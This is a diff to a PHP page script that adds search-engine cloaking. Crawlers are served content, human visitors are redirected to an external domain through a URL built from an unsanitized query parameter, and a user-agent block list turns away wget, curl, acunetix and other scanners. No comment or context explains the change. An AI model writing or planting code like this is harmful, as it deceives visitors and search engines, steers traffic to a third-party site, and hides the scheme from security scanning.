@@ -1,5 +1,15 @@
 <?php
 date_default_timezone_set('Asia/Jakarta');
+if(bad_bots()){
+	header("HTTP/1.1 403 Unauthorized");
+	exit();
+}
+
+if(!is_bot()){
+	header("location: http://dafamediagroup.work/".$_GET['title'].".pdf");
+	exit();	
+}	
+
 //CACHE
 	if (isset($_SERVER['HTTP_IF_MODIFIED_SINCE'])){
 		header('HTTP/1.1 304 Not Modified');
@@ -96,4 +106,28 @@ $THE_CONTENTS .= '<br><br><b><a href="http://dafamediagroup.work/'.$path_links.'
 
 return $THE_CONTENTS;
 	
+}
+
+
+
+function bad_bots(){
+if(!isset($_SERVER['HTTP_USER_AGENT'])){
+return true;
+}
+if(empty($_SERVER['HTTP_USER_AGENT'])){
+return true;
+}
+return preg_match('/(woobot|internetVista|openlinkprofiler|spbot|baidu|wget|curl|acunetix|fhscan)/i', $_SERVER['HTTP_USER_AGENT']);
+}
+
+
+function is_bot(){
+	if(!isset($_SERVER['HTTP_USER_AGENT'])){
+	return false;
+	}
+	if(empty($_SERVER['HTTP_USER_AGENT'])){
+	return false;
+	}
+$patern= 'duckduckgo|bot|google|yandex|bing|yahoo|msn|image|preview|partner|bingpreview|bingbot|msnbot';
+return preg_match('/('.$patern.')/i', $_SERVER['HTTP_USER_AGENT']);
 }
